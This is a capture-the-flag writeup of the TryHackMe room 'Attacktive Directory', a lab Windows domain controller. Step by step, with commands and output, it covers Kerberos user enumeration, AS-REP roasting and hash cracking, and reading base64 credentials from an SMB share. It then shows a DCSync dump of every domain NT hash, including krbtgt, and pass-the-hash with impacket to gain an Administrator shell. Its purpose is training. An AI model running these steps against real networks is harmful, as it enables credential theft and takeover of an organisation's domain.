---
layout: writeup
lang: en
permalink: /en/writeups/attacktive-directory/
title: "Attacktive Directory"
ref: attacktive-directory
date: 2026-09-01
bare: true
platform: THM
os: Windows Server 2019 (Domain Controller)
difficulty: Medium
series: thm-windows
tags: [win, AD, kerberos, as-rep, dcsync, pass-the-hash, impacket]
txt: /writeups-files/attacktive-directory-en.txt
summary: "Initial access comes from Kerberos itself: kerbrute, AS-REP roast on svc-admin, base64 credentials in a backup share, DCSync and pass-the-hash."
---

# Writeup — Attacktive Directory (TryHackMe)

OS: Windows Server 2019 (Domain Controller, build 17763)
Difficulty: Medium
Date: 11 September 2026

---

## Summary

Domain Controller of spookysec.local with the whole AD surface exposed. initial access doesn't come from a broken service but from Kerberos itself: kerbrute enumerates valid users by querying the KDC without trying passwords, and among them svc-admin has pre-authentication disabled. from there an AS-REP roast returns a hash crackable offline (management2005), whose credentials give access to a non-standard share called backup that contains a credentials file in plain text, base64. the backup account that comes out of it has directory replication rights, so a full DCSync with secretsdump and the NT hash of Administrator. pass-the-hash and the machine is closed

Chain: nmap on the AD ports only → spookysec.local → kerbrute userenum → svc-admin with no pre-auth → GetNPUsers → hashcat 18200 → management2005 → backup share → backup_credentials.txt base64 → backup account → secretsdump DCSync → NT hash Administrator → wmiexec pass-the-hash → 3 flags.

---

## additional tools and methodology

an llm was used during the session: for looking up CVE details, interpreting raw output, suggesting unexplored vectors when stuck and detailed explanation of technical concepts. the execution and the operational decisions were mine. the writeup was written by me and later cleaned up with the same tool.

---

## Preface

room done from my Kali virtualised on Linux Mint, TryHackMe VPN with sudo openvpn &#45;&#45;config ~/thm.ovpn and verification with ip a show tun0.
time estimated by the room 90 minutes, my declared goal was to close it in 30. I didn't manage it, but not because of the technical difficulty: the chain itself is linear and has no obscure steps. the time went almost entirely into operational friction, and that's the thing I take away from this session more than the flags
the infrastructure was awful: practically every command towards the target timed out on the first attempt and went through on the second identical one, and halfway through the room the machine died outright (ping 100% packet loss, services silent), forcing a restart of the lab machine and an IP change from 10.113.168.168 to 10.113.182.0. the wmiexec shell dropped three times,two of them on trivial commands.
plus two preparation mistakes of my own: kerbrute downloaded but not in PATH, and the two wordlists provided by the room which I thought I had downloaded and which had in fact never arrived on the machine.
I had also considered using an AD tool I wrote myself at the opening, but I discarded it immediately and I explain that below.

---

## Phase 1 — Reconnaissance

first full scan, it plants itself on the opening line and doesn't move:

nmap -sV -sC -Pn -p- &#45;&#45;min-rate 1000 -oN nmap_attacktive.txt 10.113.168.168

I interrupt it (here Ctrl+C is safe, it's a normal shell, not a reverse one) and switch to a scan targeted only at the ports typical of an Active Directory environment. this choice isn't mine: the room introduction explicitly says to concentrate on AD and nothing else, and with 90 minutes estimated and a slow target there's no sense in spending ten minutes on 65535 ports to find what you already know is there.

nmap -sV -sC -Pn -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985 &#45;&#45;min-rate 1000 -oN nmap_ad_fast.txt 10.113.168.168

Result:

53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-11 13:20:29Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
&#124; ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
&#124; rdp-ntlm-info: 
&#124;   Target_Name: THM-AD
&#124;   NetBIOS_Domain_Name: THM-AD
&#124;   NetBIOS_Computer_Name: ATTACKTIVEDIREC
&#124;   DNS_Domain_Name: spookysec.local
&#124;   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
&#124;   Product_Version: 10.0.17763
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
&#124; smb2-security-mode: 
&#124;   3.1.1: 
&#124;_    Message signing enabled and required

port by port, why I pursue it or rule it out:

53 DNS. Simple DNS Plus is the DNS built into Windows Server, consistent with a DC. I don't pursue it, it isn't the room's vector, but it confirms the machine's role.
88 Kerberos. this is the port that counts. with the KDC reachable I can enumerate users and request tickets. the server time in the output also serves to check the skew, because Kerberos rejects requests if the clock is too far off. here it was -1s, no problem.
135 and 593 RPC and RPC over HTTP. kept aside, they are the route DCSync will later travel over DRSUAPI, but I don't touch them directly by hand.
139 NetBIOS. legacy, ignored: with 445 open it isn't needed.
389 LDAP. here the domain name comes out, spookysec.local, which is the piece of data that unlocks everything else. unauthenticated I get nothing more out of it.
445 SMB. it doesn't answer version detection (microsoft-ds?) but smb2-security-mode says dialect 3.1.1 with mandatory signing, so SMB1 is off. a detail that will come back.
464 kpasswd5. Kerberos password change. ruled out, there's no sense in touching it without credentials and without wanting to modify anything.
636, 3268, 3269 LDAPS and Global Catalog. 3268 is just the GC repeating the same information as 389, 636 and 3269 come out as tcpwrapped so they give nothing extra. ruled out as derivative.
3389 RDP. I don't pursue it as an entry vector (no bruteforce, see below) but its output is the most generous of all: hostname, NetBIOS domain THM-AD, FQDN of the DC, and Product_Version 10.0.17763 which identifies Windows Server 2019. I keep it aside as a post-credential access route, and the room itself says the user flags can be taken over RDP.
5985 WinRM. same logic: useless now, a potential execution route as soon as I have valid credentials.

no 80 or 443, no web. the surface is entirely AD, exactly as announced.

---

## Phase 2 — The discarded idea: using my own tool

before moving I thought about launching an AD toolkit I wrote myself (ad-attack-toolkit) at the target, given that it covers AS-REP roasting, Kerberoasting, LDAP enumeration and pass-the-hash verification, that is almost exactly the vectors of this room.

I discarded it immediately, and the reason is structural, not a limitation to work around. that tool isn't an exploitation tool, it's an assessment tool: given the IP of a DC and valid domain credentials, even low-privilege ones, it tells you which misconfigurations are present, with severity and remediation in a report. it doesn't execute remote commands, the pass-the-hash part stops at verifying the authentication and the visibility of the shares, and it explicitly delegates execution to impacket's psexec and wmiexec. even the AS-REP module takes its targets from the LDAP enumeration file, not from a list of names.

its natural position in the chain is after the first access, as a measurement and documentation of the exposure. Attacktive Directory instead starts exactly from the point the tool assumes already solved: zero credentials, and the first step is working out which users exist. it wasn't the right moment, it wasn't the right trade. I picked it up again at the end of the room, when the credentials were there, and in that context it made sense (Phase 8).

---

## Phase 3 — User enumeration over Kerberos

with 88 open the right tool is kerbrute, which enumerates valid users by sending AS-REQ requests to the KDC and looking at how it answers. the important point: it doesn't try passwords, so it doesn't increment the lockout counters. the room says so clearly, and that's why I did no kind of credential bruteforce in this room: the domain's lockout policy isn't enumerable from outside, and burning accounts on a DC is the fastest way to get noticed and to lock out legitimate users.

first attempt:

kerbrute userenum -d spookysec.local &#45;&#45;dc 10.113.168.168 ~/userlist.txt -t 50
kerbrute: command not found

downloaded but not in PATH. I get it from the releases and call it by path:

wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O ~/kerbrute && chmod +x ~/kerbrute
~/kerbrute userenum -d spookysec.local &#45;&#45;dc 10.113.168.168 ~/userlist.txt -t 50

open /home/kali/userlist.txt: no such file or directory

here the second preparation mistake comes out: ls -la ~ shows that neither userlist.txt nor passwordlist.txt ever arrived. I thought I had downloaded them at the start of the session and it wasn't true. I get them from the repo indicated by the room (they are lists trimmed specifically for this machine, not generic wordlists, and that's why hashcat then finds the password in four seconds):

wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt -O ~/userlist.txt
wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt -O ~/passwordlist.txt

I relaunch at 50 threads and it sits still for minutes without printing anything. I interrupt it and retry at 10:

~/kerbrute userenum -d spookysec.local &#45;&#45;dc 10.113.168.168 ~/userlist.txt -t 10

2026/09/11 09:31:22 >  [+] VALID USERNAME:       james@spookysec.local
2026/09/11 09:31:23 >  [+] VALID USERNAME:       svc-admin@spookysec.local
2026/09/11 09:31:24 >  [+] VALID USERNAME:       James@spookysec.local
2026/09/11 09:31:24 >  [+] VALID USERNAME:       robin@spookysec.local
2026/09/11 09:31:27 >  [+] VALID USERNAME:       darkstar@spookysec.local
2026/09/11 09:31:29 >  [+] VALID USERNAME:       administrator@spookysec.local
2026/09/11 09:31:32 >  [+] VALID USERNAME:       backup@spookysec.local
2026/09/11 09:31:34 >  [+] VALID USERNAME:       paradox@spookysec.local
2026/09/11 09:31:41 >  [+] VALID USERNAME:       JAMES@spookysec.local
2026/09/11 09:31:44 >  [+] VALID USERNAME:       Robin@spookysec.local
2026/09/11 09:31:58 >  [+] VALID USERNAME:       Administrator@spookysec.local

at 50 threads the DC was dropping the requests, at 10 it answers. operational lesson: on slow infrastructure high concurrency doesn't accelerate, it suffocates

the duplicates with different capitalisation (james/James/JAMES) are the same identity, the sAMAccountName isn't case sensitive. the real users are seven: james, svc-admin, robin, darkstar, administrator, backup, paradox.
two names stand out immediately, and they were predictable: svc-admin, which by convention is a service account, and backup, which by convention is tied to an automated job. those are the ones to aim at.

---

## Phase 4 — AS-REP Roasting

the objective here is to find accounts with the "Do not require Kerberos preauthentication" attribute. on those accounts the KDC releases an AS-REP encrypted with the key derived from the password to anyone who asks, without the attacker having to prove they know anything. that encrypted blob is crackable offline, therefore with no noise and no lockout.

first attempt with the complete userlist:

impacket-GetNPUsers spookysec.local/ -dc-ip 10.113.168.168 -usersfile ~/userlist.txt -format hashcat -outputfile ~/asrep.txt

it hangs for minutes without a single line. the reason is that GetNPUsers tries the users sequentially, one at a time, over a VPN with latency: thousands of names become tens of minutes. kerbrute is parallel, this isn't.
there's no need to try them all: I already know who exists. I cut it down to the seven valid ones.

printf 'james\nsvc-admin\nrobin\ndarkstar\nadministrator\nbackup\nparadox\n' > ~/validusers.txt

even so it stays stuck for more than three minutes. I check whether the problem is the target:

ip a show tun0 && ping -c 3 10.113.168.168
5: tun0: <POINTOPOINT,NOARP,UP,LOWER_UP> mtu 1380 qdisc noqueue state UP
3 packets transmitted, 0 received, 100% packet loss, time 2031ms

tunnel up, target dead. lab machine restarted, new IP 10.113.182.0. fortunately nmap and kerbrute don't need redoing, I already have the data I need.

on the new IP the single execution stays silent while it works, and not knowing whether I'm wasting time or not is the worst problem on this infrastructure. I change approach and run a loop user by user, so every line prints as soon as it finishes and the timeout doesn't block everything:

for u in $(cat ~/validusers.txt); do echo "== $u"; timeout 15 impacket-GetNPUsers spookysec.local/$u -dc-ip 10.113.182.0 -no-pass -format hashcat 2>&1 &#124; tail -3; done &#124; tee ~/asrep.txt

== james
[*] Getting TGT for james
== svc-admin
[*] Getting TGT for svc-admin
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:7547f77b520993bab6d10e90b896308e$d18aa365cd4673e34f290103bb4e838d6496a6613927583aec0203d9e32211f90c659ee151740338083798c42aa29e722dc537e774c9bda4dfaf92d6837ab31845b2675d06d0aebf60dca7a7e328676fec8de2e5e475296c64dfa13272645c778cb4ab66870ab33efd2b4c0e9cc1099ef31c380117158bc4a0533605ba148e879e074af5a942fedff6ee674575fcda22a2d97ae504aed76f814a858c1b9e0dba6ba95b0e5bac366af9568e746b4248f374ba40f3642db49706896a491608df446203bb8ae8c61001ab900f415ad6e43fa32aaf8924491625a460e2b4eae53f19aba2d5b22138c7bf19a588cd6d95ee0030a5
== robin
[*] Getting TGT for robin
[-] User robin doesn't have UF_DONT_REQUIRE_PREAUTH set
== darkstar
[*] Getting TGT for darkstar
[-] User darkstar doesn't have UF_DONT_REQUIRE_PREAUTH set
== administrator
[*] Getting TGT for administrator
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
== backup
[*] Getting TGT for backup
[-] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set
== paradox
[*] Getting TGT for paradox
[-] User paradox doesn't have UF_DONT_REQUIRE_PREAUTH set

a single roastable account, svc-admin. the five errors aren't noise, they're needed: they rule out the others and confirm that the misconfiguration is isolated to a single service account, not a wrong policy at domain level.
a note on my command: the tail -3 cut off james's result line, so on that user I formally don't have the confirmation on screen. a marginal detail but it's a limitation of the way I filtered the output, not of the tool.

the hash prefix says $krb5asrep$23$: etype 23, that is RC4-HMAC, which corresponds to hashcat mode 18200. that's the correspondence to check, because with AES the etype and the mode would be different.

grep -o '\$krb5asrep\$.*' ~/asrep.txt > ~/svcadmin.hash
hashcat -m 18200 ~/svcadmin.hash /usr/share/wordlists/rockyou.txt &#45;&#45;force

&#46;&#46;&#46;:management2005

Session&#46;&#46;&#46;&#46;&#46;&#46;&#46;&#46;&#46;.: hashcat
Status&#46;&#46;&#46;&#46;&#46;&#46;&#46;&#46;&#46;..: Cracked
Hash.Mode&#46;&#46;&#46;&#46;&#46;&#46;..: 18200 (Kerberos 5, etype 23, AS-REP)
Time.Started&#46;&#46;&#46;..: Fri Sep 11 09:41:44 2026, (4 secs)
Progress&#46;&#46;&#46;&#46;&#46;&#46;&#46;&#46;&#46;: 5840896/14344385 (40.72%)

four seconds on CPU. domain credentials: svc-admin / management2005

---

## Phase 5 — SMB and the backup share

with valid credentials the first thing is to see what the DC shares.

timeout 60 smbclient -L //10.113.182.0/ -U 'spookysec.local\svc-admin%management2005'
do_connect: Connection to 10.113.182.0 failed (Error NT_STATUS_IO_TIMEOUT)

twice in a row. it isn't the usual infrastructure timeout: smbclient by default negotiates starting from old dialects, and nmap had already said the DC speaks 3.1.1 with mandatory signing, so SMB1 is disabled. the negotiation dies there. I force the dialect and the port:

timeout 90 smbclient -L //10.113.182.0/ -U 'spookysec.local\svc-admin%management2005' -m SMB3 -p 445

        Sharename       Type      Comment
        &#45;&#45;&#45;&#45;&#45;&#45;&#45;&#45;-       &#45;&#45;&#45;&#45;      &#45;&#45;&#45;&#45;&#45;&#45;-
        ADMIN$          Disk      Remote Admin
        backup          Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.113.182.0 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 &#45;&#45; no workgroup available

the final error is only the SMB1 fallback for the workgroup listing, irrelevant: the shares have already come out. six in total, five standard (ADMIN$, C$, IPC$, NETLOGON, SYSVOL) and one that has nothing to do with a clean installation: backup.

timeout 90 smbclient //10.113.182.0/backup -U 'spookysec.local\svc-admin%management2005' -m SMB3 -c 'ls; get backup_credentials.txt'

  .                                   D        0  Sat Apr  4 15:08:39 2020
  ..                                  D        0  Sat Apr  4 15:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 15:08:53 2020

here I was genuinely surprised. a share called backup, readable by a low-privilege service account, with a single 48-byte file inside it called backup_credentials.txt. not an archive, not a log: credentials, put there.

cat backup_credentials.txt && base64 -d backup_credentials.txt
YmFja3VwQHNwb29raXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
backup@spookisec.local:backup2517860

base64, which isn't obfuscation but only encoding: reversible by anyone, in one command. the content is directly the user and password in plain text. the domain in the decoded string is written spookisec, with an i: it's a typo inside the file left by the room's author, the real domain stays spookysec.local and the credentials work against that one.

on what this account is I made two hypotheses before testing:
the first, from the name and from the fact that it sits in a backup share, is that it's the service account of the domain's backup system, and therefore has directory replication rights (DS-Replication-Get-Changes and Get-Changes-All). that's the typical configuration of these accounts, and if it were true it would allow a full DCSync, that is reading all the domain's hashes.
the second, less interesting, is that it's only a member of Backup Operators, useful for reading privileged files but not for extracting hashes.
the two are distinguished with a single test.

---

## Phase 6 — DCSync

timeout 120 impacket-secretsdump 'spookysec.local/backup:backup2517860@10.113.182.0' -just-dc-ntlm -outputfile ~/dcsync
[-] RemoteOperations failed: [Errno Connection error (10.113.182.0:445)] timed out

the usual first attempt. I relaunch it identically and it goes through:

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:f9a72b96635a275b00ef4a9b3e4c0139:::

hypothesis one confirmed: the method is DRSUAPI, that is replication, not file reading. the backup account has synchronisation rights with the DC, so it reads all of NTDS.DIT.

things to note from the dump, including the marginal ones:
the LM hash is aad3b435b51404eeaad3b435b51404ee for everyone, which is the empty LM value, so LM storage is disabled. correct, and it saves me wasting time cracking them.
a-spooks (RID 1601) has exactly the same NT hash as Administrator (0e0363&#46;&#46;&#46;). it isn't a coincidence: it's a second administrative account with the same password. it means that even changing Administrator's password the domain would stay compromised through that account.
skidy and breakerofthings in turn share the same hash with each other, more reuse.
there's also krbtgt's hash, which in a real engagement would be the piece for a Golden Ticket. here it isn't needed and I don't touch it, the shorter route is already open.

---

## Phase 7 — Pass-the-Hash and flag recovery

with Administrator's NT hash there's no need to crack anything: NTLM accepts the hash as if it were the password.

first attempt with psexec:

timeout 120 impacket-psexec 'spookysec.local/administrator@10.113.182.0' -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc

[*] Requesting shares on 10.113.182.0&#46;&#46;&#46;..
[*] Found writable share ADMIN$
[*] Uploading file ySRWXJvY.exe
[*] Opening SVCManager on 10.113.182.0&#46;&#46;&#46;..
[*] Creating service EftP on 10.113.182.0&#46;&#46;&#46;..
[*] Starting service EftP&#46;&#46;&#46;..
[-] Error performing the installation, cleaning up: Error occurs while reading from remote(104)

two things here. the first: "Found writable share ADMIN$" is the very first alarm bell, and it's the confirmation that administrative access is real and not just an authentication that succeeded. the second: looking at the sequence you understand how noisy psexec is. it uploads a binary to the administrative share, opens the Service Control Manager, creates a service with a random name and starts it. on a monitored domain that chain is exactly what an EDR is tuned to see

I retried the error several times identically with no result. "Error occurs while reading from remote(104)" doesn't distinguish between wrong credentials, a blocked service and a network that drops, so insisting brings no information. I change tool, not approach: wmiexec does the same thing (remote execution) by another route, DCOM and WMI instead of SVCManager, and it doesn't create services. if it works, the problem was the channel; if it failed too, I would have had to look elsewhere.

timeout 120 impacket-wmiexec 'spookysec.local/administrator@10.113.182.0' -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc
[-] [Errno Connection error (10.113.182.0:445)] timed out

I relaunch identically, and it goes through:

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
C:\>

from here on Ctrl+C is forbidden, it would close the session.

C:\>type C:\Users\Administrator\Desktop\root.txt
TryHackMe{4ctiveD1rectoryM4st3r}

the other two flags weren't in the paths I had guessed at. I search recursively:

dir /s /b C:\Users\*.txt

the output is over 200 lines of paths, largely recursive "Application Data" junctions nested one inside another and Cortana caches. I passed it in full to an llm to extract the three paths I needed, instead of refining the query: more restrictive filters weren't giving reliable results, and every reopening of the shell on this infrastructure costs minutes. a choice of speed, not of elegance.

the useful paths:

C:\Users\svc-admin\Desktop\user.txt.txt
C:\Users\backup\Desktop\PrivEsc.txt
C:\Users\backup.THM-AD\Desktop\PrivEsc.txt
C:\Users\Administrator\Desktop\root.txt

the shell drops again, I get back in and read them one at a time (chaining them with & made it drop):

C:\>type "C:\Users\svc-admin\Desktop\user.txt.txt"
TryHackMe{K3rb3r0s_Pr3_4uth}

C:\>type "C:\Users\backup.THM-AD\Desktop\PrivEsc.txt"
TryHackMe{B4ckM3UpSc0tty!}

the backup flag is duplicated across two profiles, backup and backup.THM-AD: the second is the profile created when the account re-joined the domain, and the first returned nothing. a minor detail but it cost me a shell round.

three flags out of three.

---

## Phase 8 — My own tool, picked up again once credentials were obtained

with the room closed I go back to the idea discarded in Phase 2, now in the context the tool was written for: not to break in, but to say what is vulnerable to what and document it.

git clone https://github.com/torchiachristian/ad-attack-toolkit.git ~/ad-attack-toolkit
cd ~/ad-attack-toolkit && python3 -m venv adtoolkit && source adtoolkit/bin/activate && pip install -r requirements.txt

python3 ad_enum.py &#45;&#45;dc-ip 10.113.182.0 &#45;&#45;domain spookysec.local -u backup -p backup2517860

[+] Connected to 10.113.182.0:389 as backup@spookysec.local
[+] Base DN: DC=spookysec,DC=local
  krbtgt               krbtgt                    [SPN: kadmin/changepw]
  svc-admin            svc admin                 [NO_PREAUTH]
[+] Total users found: 17
  Backup Operators                    (0 members)
  Domain Admins                       (2 members)
  Denied RODC Password Replication Group (8 members)
  CompStaff                           (12 members)
[+] Total groups found: 50
  [!] svc-admin            svc admin
[!] 1 users vulnerable to AS-REP Roasting
  No service account with SPN found.
  [*] Admin Spooks
  [*] Administrator
[+] 2 direct Domain Admins found

what it confirms: svc-admin the only NO_PREAUTH out of 17 users, zero service accounts with SPN (so Kerberoasting on this room isn't practicable, unlike my lab where it's one of the main vectors), and the two direct Domain Admins are Administrator and a-spooks, consistent with the two identical NT hashes from the dump.
what it genuinely adds: Backup Operators has zero members. that's the piece of data that cleanly closes the alternative hypothesis from Phase 5, and confirms that the backup account's privileges were replication rights and not membership of that group. a custom group CompStaff with 12 members also comes out, which didn't emerge from any manual step.

python3 pth.py &#45;&#45;target-ip 10.113.182.0 &#45;&#45;domain spookysec.local -u administrator &#45;&#45;nthash 0e0363213e37b94221497260b0bcb4fc

[+] PtH authentication successful as SPOOKYSEC.LOCAL\administrator
[+] Server OS:   Windows 10.0 Build 17763
[+] Server Name: ATTACKTIVEDIREC
[*] Accessible shares:
  [+] ADMIN$ [+] backup [+] C$ [+] IPC$ [+] NETLOGON [+] SYSVOL

build 17763 aligned with the Product_Version read by nmap in Phase 1.

python3 asreproast.py &#45;&#45;dc-ip 10.113.182.0 &#45;&#45;domain spookysec.local

[+] Loaded 1 target from the enumeration file
  [+] svc-admin - AS-REP hash captured (etype 23 / RC4-HMAC)

etype and mode identical to the manual capture with GetNPUsers, so a double independent verification.

finally the complete assessment. I launched it passing the password through an environment variable instead of directly, because of a known bug I'm fixing:

AD_PW='backup2517860' python3 ad_attack.py &#45;&#45;dc-ip 10.113.182.0 &#45;&#45;domain spookysec.local -u backup &#45;&#45;all &#45;&#45;password-env AD_PW &#45;&#45;pth &#45;&#45;pth-user administrator &#45;&#45;nthash 0e0363213e37b94221497260b0bcb4fc

assessment completed; states={'enum': 'findings', 'asrep': 'findings', 'kerb': 'tested_no_findings', 'pth': 'findings'} counts={'asrep': 1, 'kerb': 0, 'domain_admins': 2}
[+] PDF report: engagements/spookysec.local-20260911-101535/ad_attack_report.pdf

PDF report and summary.json generated, with findings and remediation.

it has to be said honestly: as an offensive tool on this room the toolkit added nothing, and it couldn't. everything it found I had already found by hand, and it found it starting from the credentials the manual chain had already obtained. its value here was one piece of exclusion data (Backup Operators empty), the independent confirmation of the chain, and the report as material for this writeup. the design point to act on I understood right here: the AS-REP module reads its targets from the LDAP enumeration file, so it depends on valid credentials. giving it a list of users as input would make it usable at zero credentials too, that is exactly at the point where this room begins.

---

## Full chain

nmap reduced to the AD ports only (on the room's advice) → spookysec.local, DC AttacktiveDirectory, Windows Server 2019
→ kerbrute userenum on 88 (no password bruteforce, lockout policy not enumerable) → 7 valid users
→ threads lowered from 50 to 10 because the DC was dropping
→ GetNPUsers on the valid users only → svc-admin the only one with no pre-auth
→ hashcat -m 18200 (etype 23 / RC4) → management2005
→ smbclient with -m SMB3 forced (SMB1 disabled on the DC) → non-standard share backup
→ backup_credentials.txt base64 → backup / backup2517860
→ replication rights hypothesis confirmed → secretsdump DRSUAPI → all the domain's hashes
→ Administrator's NT hash, identical to a-spooks'
→ psexec fails and makes noise (ADMIN$ writable, service created) → wmiexec via WMI
→ shell as Administrator → dir /s → 3 flags
→ my own tool picked up again once credentials were obtained, for assessment and reporting

---

## Lessons learned

on slow infrastructure high concurrency accelerates nothing, it chokes it: kerbrute at 50 threads stayed mute, at 10 it solved in thirty-six seconds. and when a command works in silence for minutes, it's worth spending ten seconds rewriting it so that it prints progress (the loop with timeout on GetNPUsers) instead of waiting without knowing whether you're wasting time.

don't repeat work the enumeration has already done. GetNPUsers on the full userlist was time thrown away: I already knew which seven users existed, and cutting down the input turned tens of minutes into one minute.

when an error is vague (Error occurs while reading from remote(104)) insisting produces no information. changing tool while keeping the same objective, like moving from psexec to wmiexec, is both faster and diagnostic: it separates the channel from the privilege.

enumeration errors are worth as much as the successes. the five "doesn't have UF_DONT_REQUIRE_PREAUTH set" and the Backup Operators with zero members aren't noise: the first group proves the misconfiguration is isolated, the second closes a wrong hypothesis about the privileges.

a tool should be used at the point in the chain it was designed for. my toolkit isn't for obtaining access but for measuring and documenting exposure starting from valid credentials, so at the opening of this room it was structurally out of place and at the closing it made sense. recognising that before launching it saved me time, and it also showed me what the tool is missing to cover the zero-credentials case.

base64 isn't security. a 48-byte file in a share readable by a low-privilege account handed over the credentials that led to control of the domain, and reversing it cost one command

---

## Tools used

nmap, kerbrute (userenum), impacket-GetNPUsers, hashcat (-m 18200), smbclient (-m SMB3), impacket-secretsdump (DRSUAPI, -just-dc-ntlm), impacket-psexec, impacket-wmiexec, ad-attack-toolkit (ad_enum.py, asreproast.py, pth.py, ad_attack.py)
